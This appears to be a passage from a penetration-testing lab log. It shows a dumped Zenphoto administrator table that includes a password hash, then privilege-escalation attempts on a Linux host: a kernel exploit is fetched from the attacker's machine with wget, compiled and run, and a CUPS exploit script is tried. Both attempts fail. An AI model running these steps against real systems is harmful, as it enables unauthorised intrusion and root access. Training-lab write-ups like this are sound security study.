15 rows in set (0.00 sec)

mysql> select * from zp_administrators
select * from zp_administrators
    -> ;
;
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
| id | user           | pass                                     | name     | email | rights     | custom_data                                 | valid | group | date                | loggedin | quota | language | prime_album | other_credentials |
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
|  1 | administrators | NULL                                     | group    | NULL  | 1961343989 | Users with full privileges                  |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  2 | viewers        | NULL                                     | group    | NULL  |       2945 | Users allowed only to view zenphoto objects |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  3 | bozos          | NULL                                     | group    | NULL  |          0 | Banned users                                |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  4 | album managers | NULL                                     | template | NULL  |   67386245 | Managers of one or more albums              |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  5 | default        | NULL                                     | template | NULL  |        945 | Default user settings                       |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  6 | newuser        | NULL                                     | template | NULL  |          1 | Newly registered and verified users         |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  7 | admin          | 63e5c2e178e611b692b526f8b6332317f2ff5513 | admin    | admin | 1961343989 | NULL                                        |     1 | NULL  | 2011-11-09 06:56:29 | NULL     |  NULL | NULL     | NULL        | NULL              |
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
7 rows in set (0.00 sec)

mysql> 

```

## Kernel Exploit Test
```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 14814                               
  Exploit: Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/14814
     Path: /usr/share/exploitdb/exploits/linux/local/14814.c
File Type: C source, ASCII text

Copied to: /tmp/14814.c


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.162.41 - - [29/Jan/2022 05:14:51] "GET /14814.c HTTP/1.0" 200 -
```

```
www-data@offsecsrv:/etc/ssh$ uname -a
uname -a
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
www-data@offsecsrv:/etc/ssh$ gcc
gcc
gcc: no input files
www-data@offsecsrv:/etc/ssh$ cd /tmp
cd /tmp
www-data@offsecsrv:/tmp$ wget 192.168.49.162/14814.c
wget 192.168.49.162/14814.c
--2022-01-29 10:14:53--  http://192.168.49.162/14814.c
Connecting to 192.168.49.162:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14963 (15K) [text/x-csrc]
Saving to: `14814.c'

100%[======================================>] 14,963      84.3K/s   in 0.2s    

2022-01-29 10:14:54 (84.3 KB/s) - `14814.c' saved [14963/14963]

www-data@offsecsrv:/tmp$ gcc 14814.c -o exploit
gcc 14814.c -o exploit
www-data@offsecsrv:/tmp$ ./exploit
./exploit
[+] looking for symbols...
[-] symbol table not availabe, aborting!
[-] symbol table not availabe, aborting!
[+] setting up exploit payload...
[+] creating PF_CAN socket...
[+] connecting PF_CAN socket...
[+] clearing out any active OPs via RX_DELETE...
[+] removing any active user-owned shmids...
[+] massaging kmalloc-96 SLUB cache with dummy allocations
[+] corrupting BCM OP with truncated allocation via RX_SETUP...
[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...
[+] mmap'ed mapping of length 328 at 0xb7732000
[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...
[+] seeking out the smashed shmid_kernel...
[+] discovered our smashed shmid_kernel at shmid[248] = 8126712
[+] re-smashing the shmid_kernel with exploit payload...

```

Doesn't work

## Cups test

CUPS is running as root

```
www-data@offsecsrv:/tmp$ apt-cache policy cups
apt-cache policy cups
cups:
  Installed: 1.4.3-1ubuntu1.3
  Candidate: 1.4.3-1ubuntu1.5
  Version table:
     1.4.3-1ubuntu1.5 0
        500 http://us.archive.ubuntu.com/ubuntu/ lucid-updates/main Packages
        500 http://security.ubuntu.com/ubuntu/ lucid-security/main Packages
 *** 1.4.3-1ubuntu1.3 0
        100 /var/lib/dpkg/status
     1.4.3-1 0
        500 http://us.archive.ubuntu.com/ubuntu/ lucid/main Packages
www-data@offsecsrv:/tmp$ 

```

```
┌──(kali㉿kali)-[/tmp]
└─$ python 41233.py -a 192.168.162.41 -b 23 -f

             lol ty google
             0000000000000
          0000000000000000000   00
       00000000000000000000000000000
      0000000000000000000000000000000
    000000000             0000000000
   00000000               0000000000
  0000000                000000000000
 0000000               000000000000000
 000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
 000000   000000000             000000
 0000000000000000              0000000
  0000000000000               0000000
   00000000000              00000000
   00000000000            000000000
  0000000000000000000000000000000
   00000000000000000000000000000
     000  0000000000000000000
             0000000000000
              @0x00string
https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py

[*]     locate available printer
[-]     no printers
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
www-data@offsecsrv:/tmp$ /usr/sbin/lpadmin -p testpr2 -E -v parallel:/dev/lp0 -m laserjet.ppd
<sr/sbin/lpadmin -p testpr2 -E -v parallel:/dev/lp0 -m laserjet.ppd          
lpadmin: Forbidden
www-data@offsecsrv:/tmp$ 

```

# Others